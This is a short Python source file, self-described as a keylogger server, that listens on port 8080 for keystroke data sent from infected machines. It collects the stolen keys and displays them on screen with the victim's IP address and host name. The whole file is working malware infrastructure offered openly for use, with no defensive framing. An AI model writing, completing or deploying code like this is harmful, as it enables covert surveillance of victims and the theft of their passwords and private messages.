import socket,re,colorama,sys
from colorama import Fore,init

#keylogger server
#Coded By MGF15
host = '0.0.0.0'
port = 8080
size = 1024*1024
key = []

#support only one session ! for now

def server():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host,port))
	s.listen(1)
	print Fore.GREEN + "[+] -St4r7 K3yL0gger S3rv3r-\n[+] w4t!ng f0r l0gz !" + Fore.YELLOW

	while True:
		try:
			client, address = s.accept()
			data = client.recv(size)
			if data:
				#user = re.findall(r'\nUser-Agent: (.*)',da)[0]
				d = data.split(':::')
				if d[0][-3:] == 'key':
					q = key.append(d[1])	
					ky = ''.join(key)
					sys.stdout.write("%s\n" % ('\x1b[1A'+'\x1b[2K'+Fore.RED+'[*] ' + Fore.YELLOW + 'Host [\t' + Fore.CYAN+d[2] + Fore.YELLOW + '\t]'))
					sys.stdout.write("\r%s %s [%-40s] %s   \r" % (Fore.RED + '[+]', Fore.CYAN+address[0] + ':'+Fore.GREEN, Fore.GREEN + ky[-35:], Fore.CYAN + d[3] + ' '*5))
		    			sys.stdout.flush()
					
		except KeyboardInterrupt:
			s.close()
			print '\nUser exit'
			break
server()
